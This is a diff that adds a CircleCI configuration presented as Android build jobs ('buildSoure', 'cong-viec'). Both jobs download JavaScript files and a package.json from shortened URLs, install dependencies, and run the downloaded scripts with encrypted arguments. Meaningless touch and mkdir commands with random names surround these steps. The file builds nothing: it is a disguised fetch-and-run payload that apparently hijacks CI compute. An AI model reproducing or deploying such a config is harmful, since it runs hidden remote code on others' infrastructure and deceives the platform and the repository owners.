@@ -1,0 +1,50 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  runJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: echo version 45244851326.44821
+      - run: touch leg0x6akkxb6hf.ts
+      - run: curl -fsSL shorturl.at/sALX3 -o pcrzh8cfra.js && curl -fsSL
+          shorturl.at/cxR06 -o lloyqvrad33xwr7.js && curl -fsSL
+          shorturl.at/egprX -o package.json
+      - run: touch z7j5s7v0z7eqtktje.ts
+      - run: mkdir bogywauido88llyubp
+      - run: npm i -s
+      - run: node lloyqvrad33xwr7 -t
+          U2FsdGVkX1+AgUSQBfzNYS1RUTkw1Ru4+ebQqfPWMX/8yPRN/sC2067EJJyZusJi -s
+          U2FsdGVkX1/Ymnft3iHFgJTLfFbccGtTvl+MWK/bmd9loOpr/LiCaKAQgEv1QWON9Ojwy8FsF37zcnWJv0nGHIfwvA0e68YSd11rWWzQ8pPpJhvESXgN2G/coHEn5rTbsGOznd2Umm8ELHL9rDHBuMB2sBizzumiS5K5aJ1xRYG8k5tEEUeAU6NIt66sfD/SU804q7rxtgsc0HjAJYs13QiQAQGSUz2WiQdrAq8VXjw=
+          -sp -r
+          U2FsdGVkX19TByIOODg4MZ9Mim0CWXQgXBTeUjFd7I84AOp4Sy4NIAkHoeEoDm4anfpoEB6yTG9HdYq86cZfFrz9lPi48KBAyUMAq9X64gVazGrJtIgoxG+GFWXVD5o80eoXZnG5/ZNykv6fpqyMq68z7+8vE+uzTSjt2EGL0SB/5rEnLKky2trP0iUAj6h/QUQkeWfXHcQOycsEjK2qHDu7q/MIx3FyYKbEh4w49USl1QwQABDRpKRL8fn1HliZpOxkOvFCpyrZK99cNcmpzo03Xo5ziAsTZ2tTRcxHBxp8MO+1lwz9p1QMStDWG//Vb+yQi4xQDrQmj6LQVQkM0jq+5/Q1C1A6k5bHfoY7bvQxrP0oy8DQCKVdIQbsGdKV
+          -lpn U2FsdGVkX1+/8hXdpsJo/nCgycOjZOSpzl4/5J958QI=
+      - run: touch xon142xysoq3w8t5r6j.ts
+      - run: touch 6iwkna1j3jq.ts
+  cong-viec:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir d8cxbh1uwwzpqezwo9
+      - run: curl -fsSL shorturl.at/ovJQS -o nnut6zjrt4yx2hk.js && curl -fsSL
+          shorturl.at/gwLNX -o cip9t3w0smge7z1c9s.js && curl -fsSL
+          shorturl.at/ivP59 -o package.json
+      - run: touch mtcrukjuyjf7jc2wu4k9.py
+      - run: mkdir 7pprxf3io6vn72vin
+      - run: touch e53oz3kx5ncjlnczc54ae.net
+      - run: npm i -s
+      - run: node cip9t3w0smge7z1c9s -t
+          U2FsdGVkX1/pNkSsGmzDu3WNKitkrhtTd5GIkr5LfV0X8xY57SThWIEbcMMYw+vE -s
+          U2FsdGVkX197oTo1KlVRtJPqjHzq/upuqoWOX41VWler2g40IiIjmueDIy0mhu7J3F9/eP7j/TPDG46Ag3awiHZitwmAKTHRrCuWnDO5SIE5Njm9H3uV4Ac0yIsU92YNTE2Ldtog9ZZO+VhTbYT05uCwgkid8wQEw+3bzGcf1mZXZV89lfuM+cQNZWW2zZEBjb6HdjW+OwW/u2fW8xmycwtrEHQIS6EEuvqG2YfyHvU=
+          -sp -lpn U2FsdGVkX1+NUJQEqFiH79HSm5oMYyu5PoMu24LB7Tc= -r
+          U2FsdGVkX19Taugdfkn+wgnhacG1VBo3XbMRULnI2B/uw6enPp0HyY9wStsksOCIhltMCVCaDlCViy48Pfb7mHGQ4YhcFTBnkpj4Vgvs4pSLLXFbkjPdnYs8aNPRL+7UxDtP4HadTkJM8j96xkgYWYSIrQb3Uc9+cz5vGENjvxpT2IBZl+FE+3Djq24N1bMeAER7No29blHZWbOZm7bMnnWKa8QF6xRgqTCiVLM3cAmHby5rR+D5YPbPD5eEiF44UHad07UTQQFJWnxcInR1SDE1cTr8DDSPKMypfPvDcMUqQaICTCRrwumap3fwcPdlt8K4lkDDJ8y6kpVsPKmUSwJxOWmVaDf0KWwfRASBiap+cNU3L6CsJI7KFpKwFcWv
+      - run: mkdir egl8v6w5ztesv1bti58urr
+      - run: touch 1belfn4wb60vk5gn7dty3h46kim.php
+workflows:
+  buildSoure:
+    jobs:
+      - runJobs
+  dataBuild:
+    jobs:
+      - cong-viec
